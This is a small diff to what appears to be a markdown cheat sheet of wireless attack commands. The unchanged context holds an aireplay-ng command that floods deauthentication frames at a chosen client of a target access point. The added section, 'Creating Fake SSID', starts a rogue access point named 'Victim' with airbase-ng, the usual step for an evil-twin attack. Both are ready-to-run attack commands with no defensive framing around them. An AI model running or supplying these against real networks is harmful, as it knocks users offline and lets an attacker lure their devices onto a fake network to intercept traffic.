@@ -23,3 +23,7 @@ Start deauth attack for specific client of target AP
 ```
 sudo aireplay-ng --deauth 5000 -a <BSSID of target AP> -c <BSSID of target client> wlan1
 ```
+## Creating Fake SSID
+```
+sudo airbase-ng -e "Victim" -c 1 wlan2
+```
